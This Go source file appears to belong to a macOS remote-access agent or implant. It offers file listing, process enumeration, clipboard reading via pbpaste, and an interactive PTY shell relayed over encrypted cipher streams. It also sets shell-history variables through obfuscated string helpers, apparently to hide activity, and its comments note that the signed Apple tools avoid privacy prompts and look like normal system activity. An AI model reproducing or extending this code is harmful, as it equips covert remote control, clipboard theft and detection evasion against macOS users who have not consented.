//go:build darwin
// +build darwin

package functions

import (
	"bufio"
	"crypto/cipher"
	"fmt"
	"io"
	"macos_agent/utils"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"

	"github.com/creack/pty"

	"howett.net/plist"
)

func GetCP() (uint32, uint32) {
	return 0, 0
}

func IsElevated() bool {
	return os.Geteuid() == 0
}

func GetOsVersion() (string, error) {
	f, err := os.Open(utils.StrSystemVersionPlist())
	if err != nil {
		return utils.StrMacOS(), nil
	}
	defer f.Close()

	var data map[string]interface{}
	decoder := plist.NewDecoder(f)
	err = decoder.Decode(&data)
	if err != nil {
		return utils.StrMacOS(), nil
	}

	version, ok := data[utils.StrProductVersion()].(string)
	if !ok {
		return utils.StrMacOS(), nil
	}

	return fmt.Sprintf("%s %s", utils.StrMacOS(), version), nil
}

func NormalizePath(relPath string) (string, error) {
	if strings.HasPrefix(relPath, "~") {
		usr, err := user.Current()
		if err != nil {
			return "", err
		}
		relPath = filepath.Join(usr.HomeDir, relPath[1:])
	}
	path, err := filepath.Abs(relPath)
	if err != nil {
		return "", err
	}
	path = filepath.Clean(path)
	return path, nil
}

func buildFileInfo(path string, info os.FileInfo, displayName string) utils.FileInfo {
	mode := info.Mode()
	isLink := mode&os.ModeSymlink != 0

	isDir := info.IsDir()
	if isLink {
		if targetInfo, err := os.Stat(path); err == nil {
			isDir = targetInfo.IsDir()
		}
	}

	stat, ok := info.Sys().(*syscall.Stat_t)
	var nlink uint64 = 1
	var uid, gid int
	if ok {
		nlink = uint64(stat.Nlink)
		uid = int(stat.Uid)
		gid = int(stat.Gid)
	}

	username := fmt.Sprintf("%d", uid)
	if u, err := user.LookupId(username); err == nil {
		username = u.Username
	}
	group := fmt.Sprintf("%d", gid)
	if g, err := user.LookupGroupId(group); err == nil {
		group = g.Name
	}

	return utils.FileInfo{
		Mode:     mode.String(),
		Nlink:    int(nlink),
		User:     username,
		Group:    group,
		Size:     info.Size(),
		Date:     info.ModTime().Format("Jan _2 15:04"),
		Filename: displayName,
		IsDir:    isDir,
	}
}

func GetListing(path string) ([]utils.FileInfo, error) {
	var Files []utils.FileInfo

	pathInfo, err := os.Lstat(path)
	if err != nil {
		return Files, err
	}

	if !pathInfo.IsDir() {
		return []utils.FileInfo{buildFileInfo(path, pathInfo, filepath.Base(path))}, nil
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		return Files, err
	}

	for _, entry := range entries {
		fullPath := filepath.Join(path, entry.Name())
		info, err := os.Lstat(fullPath)
		if err != nil {
			return Files, err
		}

		Files = append(Files, buildFileInfo(fullPath, info, entry.Name()))
	}
	return Files, nil
}

// GetProcesses enumerates processes using macOS native ps(1).
// ps is a signed Apple binary — normal system activity, no CGO required.
func GetProcesses() ([]utils.PsInfo, error) {
	out, err := exec.Command("ps", "-axo", "pid=,ppid=,tty=,user=,comm=").Output()
	if err != nil {
		return nil, err
	}

	var Processes []utils.PsInfo
	scanner := bufio.NewScanner(strings.NewReader(string(out)))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 5 {
			continue
		}
		pid, _ := strconv.Atoi(fields[0])
		ppid, _ := strconv.Atoi(fields[1])
		tty := fields[2]
		if tty == "??" {
			tty = ""
		}
		username := fields[3]
		process := strings.Join(fields[4:], " ")

		Processes = append(Processes, utils.PsInfo{
			Pid:     pid,
			Ppid:    ppid,
			Context: username,
			Tty:     tty,
			Process: process,
		})
	}

	return Processes, nil
}

func ProcessSettings(cmd *exec.Cmd) {}

func IsProcessRunning(cmd *exec.Cmd) bool {
	if cmd.Process == nil {
		return false
	}
	err := cmd.Process.Signal(syscall.Signal(0))
	if err != nil {
		return false
	}
	return true
}

func StartPtyCommand(process *exec.Cmd, columns uint16, rows uint16) (any, error) {
	process.Env = append(os.Environ(),
		utils.StrHistory(), utils.StrHistsize(), utils.StrHistsave(),
		utils.StrHistzone(), utils.StrHistlog(),
		utils.StrHistfile(), utils.StrHistfilesize(),
	)
	windowSize := pty.Winsize{Rows: rows, Cols: columns}

	return pty.StartWithSize(process, &windowSize)
}

func StopPty(Pipe any) error {
	src := Pipe.(*os.File)
	return src.Close()
}

func RelayConnToPty(to any, from *cipher.StreamReader) {
	pipe := to.(*os.File)
	io.Copy(pipe, from)
}

func RelayPtyToConn(to *cipher.StreamWriter, from any) {
	pipe := from.(*os.File)
	io.Copy(to, pipe)
}

// GetClipboard reads the current clipboard contents using pbpaste (macOS native).
// pbpaste is a signed Apple binary — no TCC required, normal system activity.
func GetClipboard() (string, error) {
	out, err := exec.Command("pbpaste").Output()
	if err != nil {
		return "", err
	}
	return string(out), nil
}
